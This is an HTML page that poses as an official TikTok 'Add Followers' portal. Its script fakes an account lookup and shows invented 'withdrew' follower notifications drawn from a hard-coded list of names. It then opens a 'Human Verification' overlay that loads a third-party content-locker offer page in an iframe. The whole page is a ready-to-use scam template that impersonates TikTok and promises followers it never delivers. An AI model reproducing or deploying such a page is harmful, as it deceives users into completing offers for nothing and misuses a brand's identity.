<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>TikTok Verify | Official Portal</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  font-family:Arial, Helvetica, sans-serif;
  min-height:100vh;
  overflow-x:hidden;
  position:relative;
  background:
  linear-gradient(rgba(0,0,0,.55),rgba(0,0,0,.55)),
  url('https://images.unsplash.com/photo-1493225457124-a3eb161ffa5f?auto=format&fit=crop&w=1600&q=80')
  center center/cover no-repeat;
}

body::before{
  content:"";
  position:fixed;
  inset:0;
  backdrop-filter:blur(8px);
  z-index:0;
}

/* Main wrapper */
.wrapper{
  position:relative;
  z-index:2;
  min-height:100vh;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  padding:30px 15px;
}

/* Card */
.card{
  width:420px;
  max-width:92%;
  padding:34px 28px;
  border-radius:24px;
  background:rgba(8,8,8,.72);
  border:1px solid rgba(255,255,255,.12);
  box-shadow:0 20px 50px rgba(0,0,0,.45);
  text-align:center;
}

.logo{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:12px;
  margin-bottom:22px;
}

.logo i{
  font-size:42px;
  color:#25F4EE;
  text-shadow:2px 0 #FE2C55;
}

.logo h2{
  color:#fff;
  font-size:44px;
  font-weight:800;
}

.title{
  color:#fff;
  font-size:31px;
  font-weight:800;
  margin-bottom:12px;
}

.sub{
  color:#d7d7d7;
  font-size:18px;
  margin-bottom:24px;
}

.input-wrap{
  height:66px;
  border-radius:16px;
  padding:0 18px;
  display:flex;
  align-items:center;
  gap:14px;
  background:rgba(255,255,255,.04);
  border:1px solid rgba(255,255,255,.15);
  margin-bottom:18px;
}

.input-wrap i{
  color:#fff;
  font-size:28px;
}

.input-wrap input{
  flex:1;
  height:100%;
  border:none;
  outline:none;
  background:transparent;
  color:#fff;
  font-size:20px;
}

.input-wrap input::placeholder{
  color:#a8a8a8;
}

.btn{
  width:100%;
  height:66px;
  border:none;
  border-radius:16px;
  font-size:30px;
  font-weight:800;
  color:#fff;
  cursor:pointer;
  background:linear-gradient(90deg,#FE2C55 0%,#ff1f72 45%,#25F4EE 100%);
  box-shadow:0 10px 25px rgba(254,44,85,.28);
  transition: transform 0.2s;
}

.btn:active {
  transform: scale(0.98);
}

/* Modal Locker Styling */
.locker-overlay {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.85);
  z-index: 9999;
  justify-content: center;
  align-items: center;
}

.locker-content {
  width: 90%;
  max-width: 500px;
  background: #121212;
  border-radius: 20px;
  border: 1px solid #333;
  overflow: hidden;
  position: relative;
  animation: modalFadeIn 0.3s ease-out;
}

@keyframes modalFadeIn {
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
}

.locker-header {
  padding: 20px;
  text-align: center;
  border-bottom: 1px solid #222;
}

.locker-header h3 {
  color: #fff;
  font-size: 20px;
  margin-bottom: 5px;
}

.locker-header p {
  color: #a8a8a8;
  font-size: 14px;
}

.iframe-container {
  width: 100%;
  height: 450px;
}

iframe {
  width: 100%;
  height: 100%;
  border: none;
}

/* Account Preview Step */
#account-preview {
    display: none;
    margin-top: 10px;
    padding: 15px;
    background: rgba(255,255,255,0.05);
    border-radius: 20px;
    border: 1px solid #25F4EE;
    animation: modalFadeIn 0.4s;
}
.profile-img {
    width: 100px;
    height: 100px;
    border-radius: 50%;
    border: 3px solid #FE2C55;
    margin-bottom: 10px;
    object-fit: cover;
}
.profile-name {
    color: #fff;
    font-weight: 800;
    font-size: 20px;
}

/* Stats under card */
.bottom{
  margin-top:18px;
  display:flex;
  gap:40px;
  color:#fff;
  justify-content:center;
  flex-wrap:wrap;
}

.bottom .b{
  display:flex;
  align-items:center;
  gap:10px;
  font-size:18px;
  font-weight:700;
}

.bottom .b i{
  font-size:28px;
}

/* Followers section */
.history{
  width:100%;
  max-width:950px;
  margin-top:auto;
  padding-top:30px;
  display:grid;
  grid-template-columns:repeat(4,1fr);
  gap:12px;
}

.box{
  background:rgba(8,8,8,.72);
  border:1px solid rgba(255,255,255,.10);
  border-radius:16px;
  padding:14px;
  color:#fff;
  text-align:center;
}

.day{
  font-size:14px;
  font-weight: bold;
  color: #25F4EE;
  margin-bottom:6px;
}

.follow{
  font-size:24px;
  font-weight:800;
  color:#fff;
}

.time{
  font-size:13px;
  color:#9e9e9e;
  margin-top:6px;
}

/* New Live Notification Toast */
#live-toast {
    position: fixed;
    bottom: 20px;
    left: 20px;
    background: rgba(8, 8, 8, 0.95);
    border: 1px solid #25F4EE;
    padding: 15px 20px;
    border-radius: 12px;
    display: flex;
    align-items: center;
    gap: 12px;
    z-index: 10001;
    transition: 0.5s ease;
    transform: translateX(-150%);
    box-shadow: 0 0 15px rgba(37, 244, 238, 0.2);
}

.footer-pro {
    margin-top: 30px;
    text-align: center;
    color: rgba(255,255,255,0.3);
    font-size: 12px;
    letter-spacing: 1px;
}

@media(max-width:768px){
  .wrapper{
    justify-content:flex-start;
    padding-top:30px;
  }
  .history{
    grid-template-columns:repeat(2,1fr);
    margin-top:35px;
  }
  .card { width: 100%; }
  #live-toast { left: 10px; right: 10px; bottom: 10px; transform: translateY(200%); }
}
</style>
</head>

<body>

<div class="wrapper">

  <div class="card">
    <div class="logo">
      <i class="fa-brands fa-tiktok"></i>
      <h2>TikTok</h2>
    </div>

    <div id="main-view">
        <div class="title">Add Followers</div>
        <div class="sub">Enter your account name to increase followers.</div>
        <div class="input-wrap">
          <i class="fa-solid fa-at"></i>
          <input type="text" id="username" placeholder="Username">
        </div>
        <button class="btn" onclick="searchAccount()" id="btn-text">Verify</button>
    </div>

    <div id="account-preview">
        <img src="" id="userAvatar" class="profile-img" alt="User">
        <div class="profile-name" id="userDisplay">@Username</div>
        <p style="color:#2ecc71; font-weight:bold; margin:10px 0;">Account Found!</p>
        <button class="btn" onclick="showLocker()" style="font-size:24px;">Confirm & Add</button>
    </div>

  </div>

  <div class="bottom">
    <div class="b"><i class="fa-solid fa-heart"></i>234.5K</div>
    <div class="b"><i class="fa-solid fa-comment-dots"></i>87.2K</div>
    <div class="b"><i class="fa-solid fa-circle-check" style="color:#25F4EE"></i> Official</div>
  </div>

  <div class="history" id="history-grid"></div>

  <div class="footer-pro">
    <i class="fa-solid fa-shield-halved"></i> SECURE SERVER 2026 | TIKTOK PARTNER PROGRAM
  </div>

</div>

<div id="live-toast">
    <div style="width: 10px; height: 10px; background: #25F4EE; border-radius: 50%; box-shadow: 0 0 8px #25F4EE;"></div>
    <div style="color: #fff; font-size: 14px;">
        <span id="toast-user" style="font-weight: bold; color: #FE2C55;"></span> 
        <span id="toast-action">withdrew</span> 
        <span id="toast-amount" style="font-weight: bold; color: #25F4EE;"></span> 
        <span style="color: #666; font-size: 11px; display: block;" id="toast-date"></span>
    </div>
</div>

<div class="locker-overlay" id="lockerOverlay">
  <div class="locker-content">
    <div class="locker-header">
      <h3>Human Verification</h3>
      <p>Almost finished! Please complete one task below.</p>
    </div>
    <div class="iframe-container">
      <iframe src="https://ogam.site/cl/i/8229kj"></iframe>
    </div>
  </div>
</div>

<script>
  const names = ["James_V", "Sarah_Parker", "Mike_Johnson", "Emily_Official", "Chris_Vibe", "Olivia_Stars", "Ryan_Growth", "Ava_Official", "Justin_Viral", "Mia_Edits"];
  const counts = ["500", "1,200", "2,500", "5,000", "10,000"];

  function searchAccount() {
    const user = document.getElementById('username').value.trim().replace('@', '');
    if(user.length < 2) return alert("Please enter your username");
    
    const btn = document.getElementById('btn-text');
    btn.innerText = "Searching...";
    btn.disabled = true;

    // Direct Image Fetching Logic
    const avatarImg = document.getElementById('userAvatar');
    avatarImg.src = `https://www.tiktok.com/api/v1/user/avatar/?unique_id=${user}`;

    // If blocked, use a clean profile placeholder with initials
    avatarImg.onerror = function() {
        this.src = `https://ui-avatars.com/api/?name=${user}&background=25F4EE&color=000&size=128&bold=true`;
    };

    setTimeout(() => {
        document.getElementById('main-view').style.display = 'none';
        document.getElementById('account-preview').style.display = 'block';
        document.getElementById('userDisplay').innerText = "@" + user;
    }, 1800);
  }

  function showLocker() {
    document.getElementById('lockerOverlay').style.display = 'flex';
  }

  function initGrid() {
      const grid = document.getElementById('history-grid');
      let shuffled = [...names].sort(() => 0.5 - Math.random());
      for(let i=0; i<4; i++) {
          const u = shuffled[i];
          const a = counts[Math.floor(Math.random() * counts.length)];
          grid.innerHTML += `
            <div class="box">
              <div class="day">@${u} withdrew</div>
              <div class="follow">+${a} Followers</div>
              <div class="time">Today - Verified</div>
            </div>
          `;
      }
  }

  function showNotification() {
      const toast = document.getElementById('live-toast');
      const u = names[Math.floor(Math.random() * names.length)];
      const a = counts[Math.floor(Math.random() * counts.length)];
      document.getElementById('toast-user').innerText = "@" + u;
      document.getElementById('toast-amount').innerText = a + " followers";
      
      const isMobile = window.innerWidth <= 768;
      toast.style.transform = isMobile ? "translateY(0)" : "translateX(0)";
      setTimeout(() => {
          toast.style.transform = isMobile ? "translateY(200%)" : "translateX(-150%)";
      }, 4000);
  }

  window.onclick = function(event) {
    if (event.target == document.getElementById('lockerOverlay')) {
      document.getElementById('lockerOverlay').style.display = "none";
    }
  }

  initGrid();
  setInterval(showNotification, 7000);
</script>

</body>
</html>
